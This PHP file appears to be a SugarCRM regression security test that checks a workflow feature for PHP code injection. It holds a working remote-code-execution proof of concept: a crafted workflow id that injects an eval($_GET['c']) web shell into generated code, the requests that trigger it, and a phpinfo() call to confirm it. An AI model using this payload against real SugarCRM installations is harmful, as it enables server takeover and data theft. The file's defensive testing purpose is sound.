<?php
/*
 * Your installation or use of this SugarCRM file is subject to the applicable
 * terms available at
 * http://support.sugarcrm.com/Resources/Master_Subscription_Agreements/.
 * If you do not agree to all of the applicable terms or do not have the
 * authority to bind the entity as an authorized representative, then do not
 * install or use this SugarCRM file.
 *
 * Copyright (C) SugarCRM Inc. All rights reserved.
 */
declare(strict_types=1);

use Regression\SugarCRMAssessment;
use Regression\Severity;

class WorkflowInjectionAssessment extends SugarCRMAssessment
{
    public function getSeverity(): ?string
    {
        return Severity::HIGH;
    }

    public function getAssessmentDescription(): string
    {
        return 'RCE through malicious "WorkFlow" beans';
    }

    public function run(): void
    {
        $params = [
            "id" => "');}}eval(\$_GET['c']);{{{#",
            "name" => "RCE",
            "base_module" => "Bugs",
            "parent_id" => 1,
            "status" => 1,
        ];
        // Create the first Workflow
        $this->login('admin', 'asdf')
            ->bwcLogin()
            ->apiCall(
                '/WorkFlow',
                'POST',
                $params
            );
        $workflow_id = md5((string) time());
        $params["id"] = $workflow_id;
        // Create the second Workflow
        $this->apiCall(
            '/WorkFlow',
            'POST',
            $params
        );
        //Trigger code injection
        $this->get("index.php?module=WorkFlow&action=SaveSequence&workflow_id={$workflow_id}");
        $this->get('custom/modules/Bugs/workflow/workflow.php?c=phpinfo();')
            ->assumeSubstring('PHP Version', $codeInjection)
            ->checkAssumptions('Workflows are vulnerable to PHP Code Injection', $codeInjection);
    }
}
